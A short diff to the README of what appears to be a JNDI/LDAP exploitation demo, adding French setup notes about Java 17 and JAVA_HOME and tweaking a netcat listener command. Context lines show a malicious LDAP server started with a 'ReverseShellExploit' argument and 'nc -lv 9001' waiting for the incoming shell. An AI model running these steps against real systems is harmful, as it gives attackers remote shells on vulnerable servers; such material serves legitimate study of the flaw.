@@ -2,6 +2,9 @@
 
 ## Usage
 
+Testé avec Java 17. 
+Mettre à jour la variable d'environnement JAVA_HOME si nécessaire.
+
 - Run
 
 ```shell
@@ -81,7 +84,7 @@ python evil/ldap/server.py ReverseShellExploit
 - Listening for incoming (evil)
 
 ```shell
-nc -lvp 9001
+nc -lv 9001
 ```
 
 - JNDI LDAP lookup
